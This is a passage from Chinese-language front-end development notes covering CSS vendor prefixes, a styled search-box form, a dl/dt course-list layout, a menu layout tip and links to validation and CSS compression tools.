5.Glyphicon Halflings -- [http://glyphicons.com/](http://glyphicons.com/)
6.Icons8 -- [https://icons8.com/](https://icons8.com/)
```
 
>[success] # css -- 前缀
| 浏览器前缀 | 浏览器 |
| --- | --- |
| \-webkit- | Google Chrome, Safari, Android Browser |
| \-moz- | Firefox |
| \-o- | Opera |
| \-ms- | Internet Explorer, Edge |
| \-khtml- | Konqueror |
[TOC]
>[success] # 常用的一些写法
```
1.input -- 样式
2.使用dt布局效果
3.菜单布局效果
```
>[danger] ##### input -- 自定义样式
```
1.去除input 本身样式
2.使用浮动将input 和搜索布局，没有使用行内块因为，行内块之间会有距离
3.按钮使用的是背景图片的方式，使用背景居中的方式更简单显示
```
![](https://box.kancloud.cn/735d6b6dca241e7417d44b1d864896e8_430x53.png)
```
<style>
    input {
        border: 0;  /* 所有的表单边框为0 */
        box-sizing: border-box; /* CSS3盒子模型 border 和 padding 都包含到 width 里面去 */
    }
   .search{
       width:410px ;
       height: 38px;
       border: 1px solid #00a4ff;
   }
    .search input[type=text]{
        width: 360px;
        height: 38px;
        padding-left: 20px;
        float: left; /* 两个行内块 中间会有间距使用浮动布局  */
    }
   .search input[type=submit]{/* 属性选择器  type 为 submit 的文本框 */
       width: 50px;
       height: 38px;
       float: right;
       background: #00a4ff url(images/search_06.png) center center no-repeat;
   }
</style>

<div class="search">
    <form action="">
        <input type="text" placeholder="请输入关键词">
        <!-- placeholder占位符 内容输入自动清除默认值 -->
        <input type="submit"  value="">
    </form>
</div>
```
>[danger] dt -- 布局

![](https://box.kancloud.cn/b4deabc320569f3e436fefadf19ebedb_216x290.png)
```

<dl class="timetable">
    <dt>我的课程表</dt>
    <dd>
        <h4>继续学习 程序语言设计</h4>
        <p>正在学习-使用对象</p>
    </dd>
    <dd>
        <h4>继续学习 程序语言设计</h4>
        <p>正在学习-使用对象</p>
    </dd>
    <dd>
        <h4>继续学习 程序语言设计</h4>
        <p>正在学习-使用对象</p>
    </dd>
</dl>
```
>[danger] ##### 菜单布局
![](https://box.kancloud.cn/7958a4282b4beb15145ae42ead00f715_245x63.png)
```
1.ul 和li配合布局
2.使用内边距进行布局，而不是固定宽度，调整标题和标题的外边距
```
>[success] # 工具
```
1.W3C 统一验证工具： [http://validator.w3.org/unicorn/](http://validator.w3.org/unicorn/) 
2.css 压缩 -- [http://tool.chinaz.com/Tools/CssFormat.aspx](http://tool.chinaz.com/Tools/CssFormat.aspx)
```
